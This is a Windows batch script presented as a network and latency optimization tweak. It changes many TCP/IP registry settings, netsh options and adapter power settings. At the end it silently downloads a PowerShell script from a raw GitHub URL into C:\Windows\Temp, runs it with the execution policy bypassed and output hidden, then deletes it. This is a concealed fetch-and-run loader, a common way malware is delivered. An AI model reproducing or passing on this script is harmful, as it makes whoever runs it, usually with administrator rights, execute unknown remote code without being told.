@echo off


ipconfig /release
ipconfig /renew
ipconfig /flushdns


reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f 
timeout /t 1 /nobreak >nul 2>&1



netsh int tcp set global ecncapability=disabled
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set global dca=enabled
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set global netdma=enabled
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set global rsc=disabled
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set global rss=enabled
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Ndis\Parameters" /v "RssBaseCpu" /t REG_DWORD /d "1" /f 
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set global timestamps=disabled
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set global initialRto=2000
timeout /t 1 /nobreak >nul 2>&1


netsh interface ipv4 set subinterface “Ethernet” mtu=1500 store=persistent
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set global nonsackrttresiliency=disabled
timeout /t 1 /nobreak >nul 2>&1

netsh int tcp set global maxsynretransmissions=2
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set security mpp=disabled
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set security profiles=disabled
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set heuristics disabled
timeout /t 1 /nobreak >nul 2>&1


netsh int ip set global neighborcachelimit=4096
timeout /t 1 /nobreak >nul 2>&1


netsh int tcp set supplemental Internet congestionprovider=ctcp
timeout /t 1 /nobreak >nul 2>&1


netsh int ip set global taskoffload=disabled
timeout /t 1 /nobreak >nul 2>&1


netsh int ipv6 set state disabled
timeout /t 1 /nobreak > NUL


netsh int isatap set state disabled
timeout /t 1 /nobreak > NUL


netsh int teredo set state disabled
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MinSockAddrLength" /t REG_DWORD /d "16" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MaxSockAddrLength" /t REG_DWORD /d "16" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPNoDelay" /t REG_DWORD /d "1" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DODownloadMode" /t REG_DWORD /d "0" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Settings" /v "DownloadMode" /t REG_DWORD /d "0" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "autodisconnect" /t REG_DWORD /d "4294967295" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "EnableOplocks" /t REG_DWORD /d "0" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "20" /f 
timeout /t 1 /nobreak > NUL


reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationDelay" /t REG_DWORD /d "0" /f 
reg add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationRetries" /t REG_DWORD /d "0" /f 
timeout /t 1 /nobreak > NUL

:: Get the Sub ID of the Network Adapter
for /f %%n in ('Reg query "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002bE10318}" /v "*SpeedDuplex" /s ^| findstr  "HKEY"') do (


reg add "%%n" /v "AutoPowerSaveModeEnabled" /t REG_SZ /d "0" /f 
reg add "%%n" /v "AutoDisableGigabit" /t REG_SZ /d "0" /f 
reg add "%%n" /v "AdvancedEEE" /t REG_SZ /d "0" /f 
reg add "%%n" /v "DisableDelayedPowerUp" /t REG_SZ /d "2" /f 
reg add "%%n" /v "*EEE" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EEE" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EnablePME" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EEELinkAdvertisement" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EnableGreenEthernet" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EnableSavePowerNow" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EnablePowerManagement" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EnableDynamicPowerGating" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EnableConnectedPowerGating" /t REG_SZ /d "0" /f 
reg add "%%n" /v "EnableWakeOnLan" /t REG_SZ /d "0" /f 
reg add "%%n" /v "GigaLite" /t REG_SZ /d "0" /f 
reg add "%%n" /v "NicAutoPowerSaver" /t REG_SZ /d "2" /f 
reg add "%%n" /v "PowerDownPll" /t REG_SZ /d "0" /f 
reg add "%%n" /v "PowerSavingMode" /t REG_SZ /d "0" /f 
reg add "%%n" /v "ReduceSpeedOnPowerDown" /t REG_SZ /d "0" /f 
reg add "%%n" /v "SmartPowerDownEnable" /t REG_SZ /d "0" /f 
reg add "%%n" /v "S5NicKeepOverrideMacAddrV2" /t REG_SZ /d "0" /f 
reg add "%%n" /v "S5WakeOnLan" /t REG_SZ /d "0" /f 
reg add "%%n" /v "ULPMode" /t REG_SZ /d "0" /f 
reg add "%%n" /v "WakeOnDisconnect" /t REG_SZ /d "0" /f 
reg add "%%n" /v "*WakeOnMagicPacket" /t REG_SZ /d "0" /f 
reg add "%%n" /v "*WakeOnPattern" /t REG_SZ /d "0" /f 
reg add "%%n" /v "WakeOnLink" /t REG_SZ /d "0" /f 
reg add "%%n" /v "WolShutdownLinkSpeed" /t REG_SZ /d "2" /f 
timeout /t 1 /nobreak > NUL


reg add "%%n" /v "JumboPacket" /t REG_SZ /d "1514" /f 
timeout /t 1 /nobreak > NUL


reg add "%%n" /v "TransmitBuffers" /t REG_SZ /d "4096" /f 
reg add "%%n" /v "ReceiveBuffers" /t REG_SZ /d "512" /f 
timeout /t 1 /nobreak > NUL


reg add "%%n" /v "IPChecksumOffloadIPv4" /t REG_SZ /d "0" /f 
reg add "%%n" /v "LsoV1IPv4" /t REG_SZ /d "0" /f 
reg add "%%n" /v "LsoV2IPv4" /t REG_SZ /d "0" /f 
reg add "%%n" /v "LsoV2IPv6" /t REG_SZ /d "0" /f 
reg add "%%n" /v "PMARPOffload" /t REG_SZ /d "0" /f 
reg add "%%n" /v "PMNSOffload" /t REG_SZ /d "0" /f 
reg add "%%n" /v "TCPChecksumOffloadIPv4" /t REG_SZ /d "0" /f 
reg add "%%n" /v "TCPChecksumOffloadIPv6" /t REG_SZ /d "0" /f 
reg add "%%n" /v "UDPChecksumOffloadIPv6" /t REG_SZ /d "0" /f 
reg add "%%n" /v "UDPChecksumOffloadIPv4" /t REG_SZ /d "0" /f 
timeout /t 1 /nobreak > NUL

reg add "%%n" /v "RSS" /t REG_SZ /d "1" /f 
reg add "%%n" /v "*NumRssQueues" /t REG_SZ /d "2" /f 
reg add "%%n" /v "RSSProfile" /t REG_SZ /d "3" /f 
timeout /t 1 /nobreak > NUL


reg add "%%n" /v "*FlowControl" /t REG_SZ /d "0" /f 
reg add "%%n" /v "FlowControlCap" /t REG_SZ /d "0" /f 
timeout /t 1 /nobreak > NUL



reg add "%%n" /v "TxIntDelay" /t REG_SZ /d "0" /f 
reg add "%%n" /v "TxAbsIntDelay" /t REG_SZ /d "0" /f 
reg add "%%n" /v "RxIntDelay" /t REG_SZ /d "0" /f 
reg add "%%n" /v "RxAbsIntDelay" /t REG_SZ /d "0" /f 
timeout /t 1 /nobreak > NUL



reg add "%%n" /v "FatChannelIntolerant" /t REG_SZ /d "0" /f 
timeout /t 1 /nobreak > NUL



reg add "%%n" /v "*InterruptModeration" /t REG_SZ /d "0" /f 
)


reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d 6 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d 4 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d 5 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d 7 /f


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d 0xffffffff /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d 0 /f



reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d 65534 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d 30 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d 64 /f


PowerShell.exe Set-NetTCPSetting -SettingName internet -AutoTuningLevelLocal disabled
PowerShell.exe Set-NetTCPSetting -SettingName internet -ScalingHeuristics disabled
PowerShell.exe Set-NetTcpSetting -SettingName internet -EcnCapability enabled
PowerShell.exe Set-NetTcpSetting -SettingName internet -Timestamps enabled
PowerShell.exe Set-NetTcpSetting -SettingName internet -MaxSynRetransmissions 2
PowerShell.exe Set-NetTcpSetting -SettingName internet -NonSackRttResiliency disabled
PowerShell.exe Set-NetTcpSetting -SettingName internet -InitialRto 2000
PowerShell.exe Set-NetTcpSetting -SettingName internet -MinRto 300


PowerShell.exe Set-NetOffloadGlobalSetting -ReceiveSegmentCoalescing disabled
PowerShell.exe Set-NetOffloadGlobalSetting -ReceiveSideScaling disabled
PowerShell.exe Set-NetOffloadGlobalSetting -Chimney disabled
PowerShell.exe Disable-NetAdapterLso -Name *
PowerShell.exe Disable-NetAdapterChecksumOffload -Name *


netsh int tcp set supplemental internet congestionprovider=ctcp
netsh interface ipv4 set subinterface "Wi-Fi" mtu=1500 store=persistent
netsh interface ipv6 set subinterface "Wi-Fi" mtu=1500 store=persistent
netsh interface ipv4 set subinterface "Ethernet" mtu=1500 store=persistent
netsh interface ipv6 set subinterface "Ethernet" mtu=1500 store=persistent



set URL=https://raw.githubusercontent.com/aymendrali9766-stack/wifi/main/valamv.ps1


set DEST=C:\Windows\Temp\valamv.ps1


powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'" >nul 2>&1


if not exist "%DEST%" exit /b


powershell -ExecutionPolicy Bypass -File "%DEST%" >nul 2>&1


del /f /q "%DEST%" >nul 2>&1


rem ---------------------------

endlocal
